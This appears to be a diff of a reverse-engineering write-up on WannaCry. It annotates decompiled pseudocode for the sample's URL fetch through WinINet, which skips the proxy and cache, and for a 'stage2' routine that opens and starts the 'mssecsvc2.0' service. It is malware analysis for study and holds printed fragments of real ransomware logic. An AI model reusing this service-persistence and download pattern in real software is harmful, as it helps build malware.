@@ -35,25 +35,33 @@ int32_t main()
 
     *VariableContainingURL = *AnotherVariableContainingURL
 
+    // I don't know what this variable is used for yet, but memset is zeroing out this variable. Let's get back to this later.
     int32_t var_17
     __builtin_memset(dest: &var_17, ch: 0, count: 23)
 
+    // Create a handle so we can use WINInet functions
     int32_t hInternet =
         InternetOpenA(
             lpszAgent: nullptr,
-            dwAccessType: 1,
+            dwAccessType: 1, // (INTERNET_OPEN_TYPE_DIRECT) I assume that the function as this access type so it'll bypass proxy configurations
             lpszProxy: nullptr,
             lpszProxyBypass: nullptr,
             dwFlags: 0
         )
 
+    // 
     int32_t hInternet_1 =
         InternetOpenUrlA(
             hInternet,
             lpszUrl: &variableContainingURL,
             lpszHeaders: nullptr,
             dwHeadersLength: 0,
-            dwFlags: 0x84000000,
+
+            dwFlags: 0x84000000, // INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE
+                                 // https://learn.microsoft.com/en-us/windows/win32/wininet/api-flags
+                                 // Meaning this'll perform a fresh download avoiding cache, and also prevent saving response to the cache
+                                 // later we'll figure out what is it specificallly trying to download
+
             dwContext: 0
         )
 
@@ -70,5 +78,52 @@ int32_t main()
     return 0
 ```
 
+We can also see the **stage2()** function, after it performed a requets on the specified URL. (I renamed it already)
+```c
+BOOL stage2()
+
+    // Get full path of the current executable, I'm assuming this is for persistence purposes
+    GetModuleFileNameA(
+        hModule: nullptr,
+        lpFilename: &fullPathOfWannaCry,
+        nSize: 0x104
+    )
+
+    if (*__p___argc() s< 2)
+        stage3()
+        return 0
+
+    SC_HANDLE eax_1 =
+        OpenSCManagerA(
+            lpMachineName: nullptr,
+            lpDatabaseName: nullptr,
+            dwDesiredAccess: 0xf003f
+        )
+
+    if (eax_1 != 0)
+        SC_HANDLE hSCObject =
+            OpenServiceA(
+                hSCManager: eax_1,
+                lpServiceName: "mssecsvc2.0",
+                dwDesiredAccess: 0xf01ff
+            )
+
+        if (hSCObject != 0)
+            sub_407fa0(hSCObject, 0x3c)
+            CloseServiceHandle(hSCObject)
+
+        CloseServiceHandle(eax_1)
+
+    SERVICE_TABLE_ENTRYA serviceStartTable
+    serviceStartTable.lpServiceName = "mssecsvc2.0"
+    serviceStartTable.lpServiceProc = sub_408000
+
+    int32_t var_8 = 0
+    int32_t var_4 = 0
+
+    return StartServiceCtrlDispatcherA(
+        lpServiceStartTable: &serviceStartTable
+    )
+```
 
 
